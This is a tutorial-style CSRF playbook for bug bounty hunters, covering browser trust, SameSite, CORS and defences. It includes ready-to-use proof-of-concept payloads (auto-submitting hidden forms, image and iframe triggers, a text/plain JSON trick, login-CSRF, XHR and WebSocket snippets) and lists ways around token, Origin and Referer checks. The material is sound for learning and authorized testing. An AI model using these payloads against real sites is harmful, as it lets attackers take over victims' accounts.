# 🔥 CSRF — Cross-Site Request Forgery

### The Complete Bug Hunter's Playbook

> **From Zero to P1 Bounties**
> Concepts · Methodology · Burp Suite Integration · Real-World Exploitation · Bypasses · Token Analysis · Reporting
>
> Author: **Vishal** | Last Updated: February 2026
>
> _"CSRF is the confused deputy of the web — the browser blindly obeys, and the server blindly trusts."_
> — **Adapted from "The Web Application Hacker's Handbook"**

---

## ⚠️ Legal Disclaimer

> Everything in this document is for **educational purposes** and **authorized security testing only**.
> Never test on systems you do not own or have **explicit written permission** to test.
> Unauthorized access to computer systems is a **criminal offense** under laws including the CFAA (US), IT Act (India), and Computer Misuse Act (UK).
> The author accepts **no liability** for any misuse of the techniques described here.

---

## 📋 Table of Contents

| # | Section | What You'll Learn |
|---|---------|-------------------|
| 1 | [What is CSRF?](#1--what-is-csrf) | Core concept, the confused deputy, mental model |
| 2 | [Why CSRF Matters](#2--why-csrf-matters) | Impact, real breaches, bounty payouts |
| 3 | [How Browsers Cause CSRF](#3--how-browsers-cause-csrf) | Cookies, same-origin policy, the trust model |
| 4 | [Types of CSRF](#4--types-of-csrf) | All variants — GET, POST, JSON, multipart, login, logout |
| 5 | [CSRF Defenses — Know What You're Bypassing](#5--csrf-defenses--know-what-youre-bypassing) | Tokens, SameSite, referer, origin, double submit |
| 6 | [Where to Look — Attack Surface Mapping](#6--where-to-look--attack-surface-mapping) | State-changing endpoints, hidden surfaces |
| 7 | [CSRF Methodology — Step by Step](#7--csrf-methodology--step-by-step) | Complete hunting process |
| 8 | [Burp Suite Setup for CSRF Hunting](#8--burp-suite-setup-for-csrf-hunting) | Configuration, CSRF PoC generator, workflow |
| 9 | [Hands-On Lab: testphp.vulnweb.com](#9--hands-on-lab-testphpvulnwebcom) | Guided walkthrough on a live target |
| 10 | [Real-World Hunting Walkthrough](#10--real-world-hunting-walkthrough) | Methodology on a production app |
| 11 | [Bypassing CSRF Protections](#11--bypassing-csrf-protections) | 15+ bypass techniques |
| 12 | [Escalation Techniques](#12--escalation-techniques) | Turning low-impact CSRF into P1 |
| 13 | [Chaining CSRF with Other Vulns](#13--chaining-csrf-with-other-vulns) | Combo attacks for max impact |
| 14 | [Automation & Scripting](#14--automation--scripting) | PoC generators, Python scripts, HTML templates |
| 15 | [Real Bug Bounty Case Studies](#15--real-bug-bounty-case-studies) | Disclosed reports analysis |
| 16 | [Writing the Report](#16--writing-the-report) | Templates, CVSS scoring, proof of concept |
| 17 | [CSRF Checklist](#17--csrf-checklist) | Quick reference during hunting |
| 18 | [Resources & References](#18--resources--references) | Books, labs, further reading |

---

## 1. 🧠 What is CSRF?

### The One-Line Definition

**CSRF (Cross-Site Request Forgery)** occurs when an attacker **tricks a victim's browser** into making an **unwanted request** to a website where the victim is already authenticated — and the server **cannot distinguish** this forged request from a legitimate one.

### The Mental Model — The Confused Deputy

Imagine you're a bank customer. You're sitting in the bank, already logged in (your session is active). A con artist outside the bank writes a letter that says:

> _"Transfer $10,000 from my account to account #EVIL-999."_

They slip this letter onto the banker's desk while you're sitting there. The banker sees YOU sitting at the desk, assumes the letter came from YOU, and processes the transfer.

**The banker (server) was tricked into acting on behalf of the wrong person.** The banker is the "confused deputy" — they have authority to act, but they were confused about who was actually making the request.

That's CSRF. Your **browser** is the deputy. It **automatically attaches your cookies** to every request sent to a site. The attacker's malicious page triggers a request to the target site, your browser dutifully attaches your session cookie, and the server thinks it's you.

### Technical Breakdown

```
Normal Flow (Legitimate):
┌──────────┐                        ┌──────────────┐
│  You      │── Click "Change Email" │  bank.com    │
│  (browser)│── Cookie: session=abc ─→│  Server      │
│           │                        │  (trusts     │
│           │←── 200 OK, email ──────│   the cookie)│
│           │    changed             │              │
└──────────┘                        └──────────────┘

CSRF Attack:
┌──────────┐   Visit evil.com       ┌──────────────┐
│  You      │←── evil.com loads ─────│  evil.com    │
│  (browser)│   a hidden form        │  (attacker)  │
│           │                        └──────────────┘
│           │   Browser auto-submits
│           │   form to bank.com
│           │   WITH your cookie!
│           │                        ┌──────────────┐
│           │── POST /change-email ──→│  bank.com    │
│           │── Cookie: session=abc ─→│  Server      │
│           │── email=evil@hacker.com │  (thinks     │
│           │                        │   it's you!) │
│           │←── 200 OK, email ──────│              │
│           │    changed to evil@    │              │
└──────────┘                        └──────────────┘
```

### The Three Conditions for CSRF

For CSRF to work, **all three** of these must be true:

```
┌─────────────────────────────────────────────────────────────────┐
│                  THE CSRF TRIANGLE                               │
│                                                                 │
│   1. RELEVANT ACTION                                            │
│      The target site has a state-changing action the attacker   │
│      wants to trigger (change email, transfer money, delete     │
│      account, change password, add admin user, etc.)            │
│                                                                 │
│   2. COOKIE-BASED SESSION                                       │
│      The application relies solely on cookies to identify the   │
│      user. No other unpredictable token is required in the      │
│      request (no CSRF token, no custom header requirement).     │
│                                                                 │
│   3. NO UNPREDICTABLE PARAMETERS                                │
│      The request doesn't contain any parameter whose value an   │
│      attacker cannot guess. If the request needs the user's     │
│      current password, CSRF is blocked — the attacker doesn't   │
│      know it. If it needs a random token, CSRF is blocked —     │
│      the attacker can't predict it.                             │
│                                                                 │
│            All three must be TRUE for CSRF to exist.            │
└─────────────────────────────────────────────────────────────────┘
```

### Vulnerable Code vs Secure Code

**❌ Vulnerable (Python/Flask):**

```python
@app.route('/change-email', methods=['POST'])
@login_required
def change_email():
    # Takes new email from POST body — no CSRF token checked
    new_email = request.form.get('email')
    current_user.email = new_email
    db.session.commit()
    return "Email updated!"
```

Any website can create a form that POSTs to `/change-email` with `email=evil@hacker.com`. The browser will include the victim's session cookie automatically.

**✅ Secure (Python/Flask with CSRF token):**

```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/change-email', methods=['POST'])
@login_required
def change_email():
    # Flask-WTF automatically validates the CSRF token
    # The token is unique per session and unpredictable
    new_email = request.form.get('email')
    current_user.email = new_email
    db.session.commit()
    return "Email updated!"
```

The form includes a hidden field:
```html
<input type="hidden" name="csrf_token" value="IjYxOGUwZjQ4ZmY3MTg...">
```

The attacker's page **cannot read this token** (blocked by Same-Origin Policy), so they can't include it in their forged request.

### CSRF in the OWASP Classification

```
OWASP Top 10 History:
├── 2007: A5 — Cross-Site Request Forgery
├── 2010: A5 — Cross-Site Request Forgery
├── 2013: A8 — Cross-Site Request Forgery
├── 2017: Removed from Top 10 (frameworks now include CSRF protection)
├── 2021: Falls under A01 — Broken Access Control
│
└── Why was it "removed"?
    ├── Most modern frameworks (Django, Rails, Laravel, Spring) 
    │   include CSRF protection BY DEFAULT
    ├── SameSite cookie attribute adoption increased
    └── BUT: It still exists! Misconfigurations, SPAs, APIs,
        and custom implementations remain vulnerable.
```

> 📖 **From "Bug Bounty Bootcamp" by Vickie Li:**
> _"Although CSRF was dropped from the OWASP Top 10 in 2017, it's still very much alive. SameSite cookie defaults have reduced the attack surface, but many applications override these defaults, use custom session handling, or have specific endpoints where CSRF protections were forgotten."_

### CSRF vs XSS — Understanding the Difference

Many beginners confuse CSRF and XSS. Here's the clear distinction:

```
┌────────────────────────────┬─────────────────────────────────────┐
│         CSRF               │              XSS                    │
├────────────────────────────┼─────────────────────────────────────┤
│ Exploits the SERVER's      │ Exploits the USER's trust           │
│ trust in the browser       │ in the website                      │
│                            │                                     │
│ Attacker CANNOT read       │ Attacker CAN read responses,        │
│ the response               │ steal cookies, execute JS           │
│                            │                                     │
│ Limited to actions         │ Can do anything the user             │
│ (state changes only)       │ can do + steal data                 │
│                            │                                     │
│ Requires victim to visit   │ Requires victim to visit            │
│ attacker's page            │ the vulnerable page                 │
│                            │                                     │
│ One-shot: fire and forget  │ Persistent or reflected             │
│                            │                                     │
│ Blocked by CSRF tokens     │ Blocked by output encoding,         │
│ and SameSite cookies       │ CSP, input validation               │
└────────────────────────────┴─────────────────────────────────────┘

Key insight: XSS can be used to BYPASS CSRF protections
(steal the CSRF token from the page, then forge the request)
```

### Key Terminology

| Term | Meaning |
|------|---------|
| **CSRF / XSRF** | Cross-Site Request Forgery (same thing, two abbreviations) |
| **CSRF Token** | A random, unpredictable value tied to the user's session, included in forms |
| **SameSite Cookie** | Cookie attribute that restricts cross-site sending (Lax, Strict, None) |
| **State-Changing Request** | A request that modifies data (POST, PUT, DELETE) — CSRF targets these |
| **Idempotent Request** | A request that doesn't change state (GET) — not a CSRF target (usually) |
| **Origin Header** | HTTP header sent by browsers indicating where the request originated |
| **Referer Header** | HTTP header showing the URL of the page that triggered the request |
| **Confused Deputy** | Security concept — a trusted entity tricked into misusing its authority |
| **PoC (Proof of Concept)** | The HTML page you create to demonstrate the CSRF attack |
| **Double Submit Cookie** | CSRF defense pattern: token in both cookie and form field |

---

## 2. 💰 Why CSRF Matters

### The Business Impact

CSRF allows an attacker to **act as the victim** on any website the victim is logged into. The attacker just needs the victim to click a link or visit a page.

Consider the damage:

```
CSRF on /change-email
    → Attacker changes victim's email
    → Attacker requests password reset
    → Reset link goes to attacker's email
    = FULL ACCOUNT TAKEOVER

CSRF on /transfer-funds
    → Attacker initiates bank transfer from victim's account
    = FINANCIAL THEFT

CSRF on /admin/create-user
    → Attacker creates admin account on victim's admin panel
    = COMPLETE APPLICATION COMPROMISE

CSRF on /delete-account
    → Attacker permanently deletes victim's account
    = DATA DESTRUCTION / DENIAL OF SERVICE

CSRF on /settings/disable-2fa
    → Attacker disables two-factor authentication
    → Combined with credential stuffing
    = ACCOUNT TAKEOVER CHAIN
```

### Real-World CSRF Breaches

| Year | Target | What Happened | Impact |
|------|--------|---------------|--------|
| 2008 | **Netflix** | CSRF allowed changing the delivery address and email of any account | Full account takeover for millions of users |
| 2008 | **ING Direct** | CSRF on fund transfer endpoint allowed stealing money | Direct financial theft from bank accounts |
| 2006 | **Gmail** | CSRF in Gmail filters allowed attackers to create email forwarding rules | Emails silently forwarded to attacker for months |
| 2012 | **YouTube** | CSRF allowed adding videos to any user's playlist, subscribing, etc. | Could manipulate any YouTube account's activity |
| 2016 | **Facebook** | CSRF in page management allowed taking over any Facebook Page | Brand pages hijacked via single click |
| 2019 | **WordPress** | CSRF in comment system chained with XSS for stored attacks | Millions of WordPress sites vulnerable |
| 2020 | **TikTok** | CSRF allowed changing profile info and posting on behalf of users | Millions of accounts could be manipulated |

### Bug Bounty Payouts for CSRF

```
┌─────────────────────────────────────────────────────────────┐
│              CSRF BUG BOUNTY PAYOUT RANGES                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Low-Impact CSRF                                            │
│  ├── Change non-sensitive settings:     $100  — $300        │
│  ├── Newsletter subscription change:    $50   — $200        │
│  └── Change display name:              $100  — $500        │
│                                                             │
│  Medium-Impact CSRF                                         │
│  ├── Change email address:             $500  — $2,000      │
│  ├── Change notification settings:     $200  — $800        │
│  ├── Create/delete non-critical data:  $300  — $1,500      │
│  └── Add user to team/group:           $500  — $2,000      │
│                                                             │
│  High-Impact CSRF                                           │
│  ├── Password change (no old pass):    $1,000 — $5,000     │
│  ├── Disable MFA/2FA:                  $1,500 — $5,000     │
│  ├── Fund transfer / financial action: $2,000 — $10,000    │
│  ├── Delete account:                   $1,000 — $5,000     │
│  └── Create admin account:             $2,000 — $8,000     │
│                                                             │
│  Critical CSRF (Chained)                                    │
│  ├── CSRF → Account Takeover:          $3,000 — $15,000    │
│  ├── CSRF + XSS → Worm:               $5,000 — $25,000    │
│  └── CSRF → Admin panel compromise:    $5,000 — $20,000    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Why CSRF Still Exists in 2026

Despite framework defaults and SameSite cookies:

```
1. SameSite=Lax still allows GET-based CSRF
   → Top-level navigations with GET still send cookies
   → If a GET request changes state → CSRF is possible

2. Developers set SameSite=None for cross-site functionality
   → OAuth flows, embedded widgets, payment redirects
   → This explicitly opts out of SameSite protection

3. CSRF tokens misconfigured
   → Token present but not validated server-side
   → Token not tied to session (reusable across sessions)
   → Token only checked on some endpoints, not all

4. JSON APIs assumed safe
   → "You can't send JSON from a form!" (wrong — you CAN)
   → Content-Type checks can be bypassed

5. Single Page Applications (SPAs) with token in localStorage
   → Cookies aren't used → but auth tokens might be in cookies anyway
   → Hybrid auth patterns create gaps

6. Legacy endpoints in modern applications
   → The main app is secure, but /legacy/*, /admin/*, /api/v1/*
      still lack CSRF protections
```

> 📖 **From "The Web Application Hacker's Handbook" (Stuttard & Pinto):**
> _"CSRF attacks exploit the fundamental trust model of HTTP authentication. As long as browsers automatically include credentials with requests, and as long as applications rely on those credentials alone for authentication, CSRF will remain a viable attack vector."_

---

## 3. 🌐 How Browsers Cause CSRF

You cannot properly hunt CSRF without understanding **why browsers make it possible**. This section is the technical foundation.

### The Cookie Auto-Attach Problem

This is the single behavior that makes CSRF possible:

```
FUNDAMENTAL BROWSER BEHAVIOR:
When a browser sends a request to example.com,
it AUTOMATICALLY attaches ALL cookies for example.com.

It does not matter WHERE the request originated from.

Request from example.com        → Cookies attached ✅
Request from evil-site.com      → Cookies attached ✅  ← THIS IS THE PROBLEM
Request from <img> tag          → Cookies attached ✅
Request from <form> tag         → Cookies attached ✅
Request from JavaScript fetch() → Cookies attached ✅ (if credentials: 'include')
Request from <iframe>           → Cookies attached ✅ (if SameSite=None)
```

### Same-Origin Policy (SOP) — What It Does and Doesn't Protect

The Same-Origin Policy is the browser's main security boundary. But CSRF hunters need to understand its **limits**:

```
Same-Origin Policy PREVENTS:
✅ evil.com from READING responses from bank.com
✅ evil.com JavaScript from accessing bank.com cookies
✅ evil.com from reading bank.com's DOM/content

Same-Origin Policy does NOT PREVENT:
❌ evil.com from SENDING requests to bank.com
❌ evil.com from submitting forms to bank.com
❌ evil.com from loading images/scripts from bank.com
❌ evil.com from creating <iframe> pointing to bank.com

Key insight: SOP blocks READING, not SENDING.
CSRF doesn't need to read the response — it just needs to SEND the request.
```

### Origin Comparison

Two URLs have the **same origin** only if protocol, host, AND port all match:

```
https://example.com/page1
https://example.com/page2       → Same origin ✅

https://example.com
http://example.com              → Different origin ❌ (protocol)
https://example.com
https://api.example.com         → Different origin ❌ (host)
https://example.com
https://example.com:8443        → Different origin ❌ (port)
```

### How Different HTML Elements Send Cross-Site Requests

```
┌────────────────────────┬─────────┬──────────┬──────────────────────┐
│ HTML Element           │ Method  │ Cookies? │ Can set body?        │
├────────────────────────┼─────────┼──────────┼──────────────────────┤
│ <form method="POST">   │ POST    │ Yes      │ Yes (form fields)    │
│ <form method="GET">    │ GET     │ Yes      │ No (query string)    │
│ <img src="...">        │ GET     │ Yes      │ No                   │
│ <script src="...">     │ GET     │ Yes      │ No                   │
│ <link href="...">      │ GET     │ Yes      │ No                   │
│ <iframe src="...">     │ GET     │ Yes*     │ No                   │
│ <video src="...">      │ GET     │ Yes      │ No                   │
│ <object data="...">    │ GET     │ Yes      │ No                   │
│ fetch() w/ credentials │ Any     │ Yes      │ Yes (JSON, etc.)     │
│ XMLHttpRequest         │ Any     │ Yes      │ Yes (JSON, etc.)     │
│ window.location =      │ GET     │ Yes      │ No                   │
│ <a href="...">         │ GET     │ Yes      │ No (needs click)     │
│ <meta refresh>         │ GET     │ Yes      │ No                   │
└────────────────────────┴─────────┴──────────┴──────────────────────┘

* iframe cookies depend on SameSite attribute

Key for CSRF:
- <form> is the most powerful: POST + custom body + cookies
- <img> is useful for GET-based CSRF (no user interaction needed)
- fetch()/XHR can send JSON but are limited by CORS preflight
```

### The SameSite Cookie Attribute — The Modern Defense

```
SameSite=Strict
├── Cookie is NEVER sent on cross-site requests
├── Not even on top-level navigations (clicking a link)
├── Maximum protection, but breaks UX
│   (clicking a link to bank.com from email → no session → must re-login)
└── CSRF: Fully protected ✅

SameSite=Lax (DEFAULT in modern browsers since 2021)
├── Cookie IS sent on top-level GET navigations
│   (clicking a link, typing URL, bookmarks)
├── Cookie is NOT sent on:
│   ├── Cross-site POST submissions (form POST from evil.com)
│   ├── Cross-site iframe loads
│   ├── Cross-site AJAX/fetch requests
│   └── Cross-site image/script loads
├── Good balance of security and usability
└── CSRF: Protected against POST-based attacks ✅
         Still vulnerable to GET-based state changes ⚠️

SameSite=None
├── Cookie is sent on ALL cross-site requests
├── MUST also have Secure flag (HTTPS only)
├── Used for: OAuth, embedded content, payment widgets,
│   cross-domain SSO, advertising/tracking
└── CSRF: NO PROTECTION ❌
         This is the old behavior — everything is vulnerable
```

### The CORS Preflight — Why It Partially Helps

When JavaScript tries to send a cross-origin request with a non-simple content type (like `application/json`), the browser sends a **preflight OPTIONS request** first:

```
JavaScript on evil.com tries:
fetch('https://bank.com/api/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    credentials: 'include',
    body: '{"to":"attacker","amount":10000}'
})

Browser first sends:
OPTIONS /api/transfer HTTP/1.1
Host: bank.com
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type

If bank.com responds:
Access-Control-Allow-Origin: https://bank.com  (not evil.com)
→ Preflight FAILS → Request is BLOCKED ✅

BUT if bank.com responds:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
→ Request goes through → CSRF possible ❌
```

**Important:** HTML `<form>` submissions do NOT trigger preflight — they always go through. That's why form-based CSRF works even when CORS would block fetch().

```
Content-Types that DON'T trigger preflight ("simple" requests):
├── application/x-www-form-urlencoded   ← HTML form default
├── multipart/form-data                 ← File upload form
└── text/plain                          ← Can abuse this!

Content-Types that DO trigger preflight:
├── application/json          ← Most modern APIs
├── application/xml           ← XML APIs
└── Any custom Content-Type   ← Custom headers
```

> 📖 **From "The Tangled Web" by Michal Zalewski:**
> _"The distinction between simple and preflighted requests is one of the most important — and most misunderstood — aspects of browser security. An application that relies on Content-Type: application/json as its only CSRF defense is making a dangerous assumption about what browsers will and won't send without a preflight."_

---

## 4. 🎯 Types of CSRF

CSRF is not one trick — it's a family of techniques. Each type has a different PoC, different prerequisites, and different bypass potential.

### Type 1: GET-Based CSRF

The simplest form. A state-changing action happens via a GET request.

```
Vulnerable endpoint:
GET /api/settings/change-email?email=evil@hacker.com

PoC (zero-click — loads automatically):
<img src="https://target.com/api/settings/change-email?email=evil@hacker.com" 
     width="0" height="0">

Alternative PoCs:
<iframe src="https://target.com/api/settings/change-email?email=evil@hacker.com"
        style="display:none"></iframe>

<script>
  new Image().src = "https://target.com/api/settings/change-email?email=evil@hacker.com";
</script>

<link rel="stylesheet" 
      href="https://target.com/api/settings/change-email?email=evil@hacker.com">
```

**Why it works with SameSite=Lax:** Top-level navigations (like clicking links) send Lax cookies with GET. But `<img>` and `<iframe>` don't count as top-level navigations — so for subresource loads, you need `SameSite=None`.

**GET-based CSRF with top-level navigation (works with SameSite=Lax):**

```html
<!-- Method 1: Auto-redirect -->
<html>
<body>
<script>
  window.location = "https://target.com/settings/change-email?email=evil@hacker.com";
</script>
</body>
</html>

<!-- Method 2: Clickjacking hybrid — disguised link -->
<a href="https://target.com/settings/change-email?email=evil@hacker.com">
  Click here to claim your prize!
</a>
```

> ⚡ **Key Rule:** GET requests should NEVER change state. But developers break this rule constantly. Always test GET endpoints for state changes.

### Type 2: POST-Based CSRF (Form Submission)

The most classic and most common CSRF type.

```
Vulnerable endpoint:
POST /account/change-email
Content-Type: application/x-www-form-urlencoded

email=victim@email.com
```

**PoC — Auto-submitting form:**

```html
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/account/change-email" method="POST">
    <input type="hidden" name="email" value="evil@hacker.com">
  </form>
</body>
</html>
```

**How it works:**
1. Victim visits this page (attacker sends link, embeds in iframe, etc.)
2. `onload` fires immediately → form auto-submits
3. Browser sends POST to target.com with victim's cookies
4. Server processes the request as if the victim made it
5. Email changed → attacker can now reset password → ATO

### Type 3: JSON-Based CSRF

Modern APIs use `application/json`. This is harder but **not impossible**.

```
Vulnerable endpoint:
POST /api/profile/update
Content-Type: application/json

{"email": "evil@hacker.com"}
```

**Challenge:** HTML forms can't set `Content-Type: application/json`. fetch() with JSON triggers a CORS preflight.

**Bypass 1: text/plain trick with form enctype:**

```html
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/api/profile/update" 
        method="POST" 
        enctype="text/plain">
    <input type="hidden" 
           name='{"email":"evil@hacker.com","ignore":"' 
           value='"}'>
  </form>
</body>
</html>
```

The form sends:
```
Content-Type: text/plain

{"email":"evil@hacker.com","ignore":"="}
```

If the server parses this as JSON (many do — Express, Flask, etc.), the `"ignore":"="` is just an extra field that's ignored.

**Bypass 2: If server accepts form-encoded as JSON:**

```html
<form action="https://target.com/api/profile/update" method="POST">
  <input type="hidden" name="email" value="evil@hacker.com">
</form>
```

Some servers/frameworks auto-detect content type and parse form data as if it were JSON parameters.

**Bypass 3: Flash-based (legacy) or navigator.sendBeacon:**

```javascript
// sendBeacon can send data with minimal restrictions
navigator.sendBeacon('https://target.com/api/profile/update', 
    new Blob(['{"email":"evil@hacker.com"}'], {type: 'text/plain'}));
```

### Type 4: Multipart Form CSRF

For endpoints that expect file uploads or multipart data:

```html
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/api/profile/update" 
        method="POST" 
        enctype="multipart/form-data">
    <input type="hidden" name="email" value="evil@hacker.com">
    <input type="hidden" name="name" value="Hacked">
  </form>
</body>
</html>
```

Multipart is a **"simple" request type** — no CORS preflight needed!

### Type 5: Login CSRF

Force the victim to **log into the attacker's account**. This sounds harmless, but it's devastating.

```html
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/login" method="POST">
    <input type="hidden" name="username" value="attacker_account">
    <input type="hidden" name="password" value="attacker_password">
  </form>
</body>
</html>
```

**Why this is dangerous:**

```
Attack scenario:
1. Victim visits attacker's page → auto-logs into attacker's account
2. Victim doesn't notice (the site looks normal, they think they're logged in)
3. Victim adds payment method → saved to ATTACKER's account
4. Victim enters search queries → attacker sees search history
5. Victim uploads files → files go to ATTACKER's account
6. Victim enters personal info → attacker harvests it

Real-world impact:
├── Google: Login CSRF → victim's searches logged in attacker's history
├── PayPal: Login CSRF → victim adds credit card to attacker's PayPal
└── iCloud: Login CSRF → victim's photos sync to attacker's account
```

> 📖 **From "Real-World Bug Hunting" by Peter Yaworski:**
> _"Login CSRF is consistently underrated by both developers and triagers. The ability to force a user into an attacker-controlled session opens up attack vectors that are only limited by the attacker's creativity."_

### Type 6: Logout CSRF

Force the victim to be logged out. This is usually low severity on its own but useful in chains.

```html
<img src="https://target.com/logout" width="0" height="0">
```

**Chain value:** Force logout → force login to attacker's account (Login CSRF) → harvest victim's data.

### Type 7: CSRF via XMLHttpRequest (with CORS Misconfiguration)

If the target has a CORS misconfiguration allowing arbitrary origins:

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/change-email", true);
xhr.withCredentials = true;  // Include cookies
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({"email": "evil@hacker.com"}));
```

This requires the server to respond with:
```
Access-Control-Allow-Origin: https://evil.com  (or *)
Access-Control-Allow-Credentials: true
```

### Type 8: CSRF via WebSocket

WebSocket connections don't have the same CORS restrictions:

```javascript
// From evil.com
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = function() {
    ws.send(JSON.stringify({
        "action": "change_email",
        "email": "evil@hacker.com"
    }));
};
```

WebSocket handshakes include cookies but **don't verify Origin by default**. Many WebSocket implementations are vulnerable to CSRF.

### Quick Reference: CSRF Types

```
┌───────────────────────┬────────────┬──────────────┬────────────────────┐
│ Type                  │ Difficulty │ SameSite=Lax │ Typical Severity   │
├───────────────────────┼────────────┼──────────────┼────────────────────┤
│ GET-based             │ Easy       │ Possible*    │ Low-High           │
│ POST form-encoded     │ Easy       │ Blocked      │ Medium-Critical    │
│ JSON body             │ Medium     │ Blocked      │ Medium-Critical    │
│ Multipart form        │ Easy       │ Blocked      │ Medium-Critical    │
│ Login CSRF            │ Easy       │ Blocked      │ Medium-High        │
│ Logout CSRF           │ Easy       │ Possible*    │ Low                │
│ XHR + CORS misconfig  │ Medium     │ Depends      │ High-Critical      │
│ WebSocket CSRF        │ Medium     │ N/A          │ Medium-High        │
└───────────────────────┴────────────┴──────────────┴────────────────────┘

* GET-based via top-level navigation sends SameSite=Lax cookies
```

---

## 5. 🛡️ CSRF Defenses — Know What You're Bypassing

To bypass protections, you must first understand them deeply. This section covers every CSRF defense mechanism and its weaknesses.

### Defense 1: CSRF Tokens (Synchronizer Token Pattern)

**How it works:**
```
1. Server generates a random token per session (or per request)
2. Token is embedded in the HTML form as a hidden field
3. When the form is submitted, the token is sent along
4. Server validates: does the token match the one stored in the session?

<form action="/change-email" method="POST">
    <input type="hidden" name="csrf_token" 
           value="a8f3e2b1c4d6e8f0a1b2c3d4e5f6a7b8">
    <input type="text" name="email" value="">
    <button type="submit">Update</button>
</form>
```

**Why it stops CSRF:** The attacker can't read the token (blocked by SOP), so they can't include it in their forged form.

**Weaknesses to test:**
```
☐ Token present in HTML but NOT validated server-side
☐ Token validated only for POST, not for PUT/DELETE
☐ Removing the token parameter entirely still works
☐ Token not tied to session (any valid token works for any session)
☐ Token reusable (not rotated after use)
☐ Token leaked in URL (Referer header can expose it)
☐ Token generated with weak randomness (predictable)
☐ Token in cookie AND parameter but comparison is flawed
☐ Different pages share the same token (steal from public page)
```

### Defense 2: SameSite Cookie Attribute

Already covered in Section 3, but here's the testing perspective:

```
Testing SameSite:
1. Check Set-Cookie header:
   Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly

2. If SameSite=Lax:
   → POST-based CSRF is blocked
   → GET-based CSRF via top-level navigation still works
   → Test all GET endpoints that change state

3. If SameSite=Strict:
   → Almost all CSRF is blocked
   → Edge case: window.open() then manipulate after 2 minutes 
     (some browsers have a 2-min Lax window on new cookies)

4. If SameSite=None (or missing in old browsers):
   → All CSRF types work
   → This is your green light

5. If SameSite is absent:
   → Modern browsers default to Lax
   → Old browsers (pre-2020) default to None
```

### Defense 3: Origin Header Validation

**How it works:**
```
Server checks the Origin header on incoming requests:

POST /change-email HTTP/1.1
Host: target.com
Origin: https://target.com     ← Server checks this

If Origin != target.com → reject the request
```

**Weaknesses to test:**
```
☐ Server only checks if Origin is PRESENT (null Origin bypass)
☐ Server checks Origin with string matching (subdomain bypass)
    Origin: https://target.com.evil.com
    Origin: https://evil-target.com
☐ Server allows null Origin
    <iframe sandbox="allow-forms" src="data:text/html,...">
    (sandboxed iframes send Origin: null)
☐ Origin header stripped by proxy/CDN
☐ Server trusts regex: /target\.com/ matches attacker-target.com
☐ Origin not checked for certain HTTP methods
☐ Origin not checked when absent (some requests don't include it)
```

### Defense 4: Referer Header Validation

**How it works:**
```
Server checks where the request came from:

POST /change-email HTTP/1.1
Host: target.com
Referer: https://target.com/settings

If Referer doesn't start with target.com → reject
```

**Weaknesses to test:**
```
☐ Server only checks if Referer CONTAINS target.com
    Referer: https://evil.com/target.com  → Passes!
    Referer: https://target.com.evil.com  → Passes!

☐ Server only checks if Referer STARTS WITH target.com
    Create: https://target.com.evil.com/  → Passes!

☐ Server accepts empty/missing Referer
    <meta name="referrer" content="no-referrer">
    → Referer header is suppressed → bypass if server allows absence

☐ Referer stripped in HTTPS → HTTP downgrade
    If target is HTTP, refer from HTTPS page → Referer stripped

☐ Referer validation only on POST, not on GET
☐ Regex bypass: Referer validation with flawed regex
```

### Defense 5: Double Submit Cookie

**How it works:**
```
1. Server sets a random token in a cookie:
   Set-Cookie: csrf=random123

2. Frontend reads the cookie via JavaScript and includes it as a 
   header or form field:
   X-CSRF-Token: random123

3. Server compares: cookie value == header/parameter value?
   If they match → request is legitimate
```

**Why it works:** An attacker can't read the victim's cookies cross-site (SOP), so they can't set the correct header value.

**Weaknesses to test:**
```
☐ Cookie is set without HttpOnly → XSS can steal it
☐ Subdomain can set parent domain cookies (cookie injection)
    attacker.target.com can set Cookie: csrf=attacker_value for target.com
    Then include csrf=attacker_value in the form → match!
    This is called a "cookie tossing" attack

☐ Cookie value is predictable or static
☐ Comparison is not strict (e.g., loose type comparison)
☐ The CSRF cookie doesn't have Secure flag → MitM can inject
```

### Defense 6: Custom Request Headers

**How it works:**
```
The application requires a custom header that HTML forms can't set:

POST /api/change-email
X-Requested-With: XMLHttpRequest    ← Required
Content-Type: application/json      ← Triggers preflight

Without the header → request rejected
Cross-origin requests with custom headers → trigger CORS preflight
If preflight fails → request never sent
```

**Weaknesses to test:**
```
☐ Server checks for header presence but not value
    X-Requested-With: anything  → Accepted?

☐ Server only checks on some endpoints
☐ Flash/Silverlight/PDF plugins could set custom headers (legacy)
☐ CORS misconfiguration allows the header from evil.com
☐ Content-Type is the only "protection" (bypass with text/plain)
```

### Defense 7: Re-authentication / Confirmation

**How it works:**
```
Sensitive actions require the user to re-enter their password:

POST /change-email
email=new@email.com
current_password=user_must_type_this     ← Attacker doesn't know this
```

**This is the strongest CSRF defense** because even if all other protections fail, the attacker can't guess the user's current password.

**Weaknesses to test:**
```
☐ Password field present but not validated server-side
☐ Password check is client-side only (JavaScript)
☐ CAPTCHA instead of password → CAPTCHA bypass
☐ Password check bypassed by removing the parameter
☐ Different endpoints for same action — one requires password, one doesn't
```

### Defense Comparison Table

```
┌───────────────────────────┬────────────┬────────────────────────────────────┐
│ Defense                   │ Strength   │ Common Weakness                    │
├───────────────────────────┼────────────┼────────────────────────────────────┤
│ CSRF Token (Synchronizer) │ Strong     │ Not validated, not tied to session │
│ SameSite=Strict           │ Very Strong│ Breaks UX, devs set to None       │
│ SameSite=Lax              │ Good       │ GET-based state changes            │
│ Origin Validation         │ Good       │ Null origin, regex flaws           │
│ Referer Validation        │ Moderate   │ Referer suppression, string match  │
│ Double Submit Cookie      │ Good       │ Subdomain cookie tossing           │
│ Custom Headers            │ Good       │ CORS misconfiguration              │
│ Re-authentication         │ Strongest  │ Not validated server-side          │
│ Content-Type check        │ Weak       │ text/plain bypass, form enctype    │
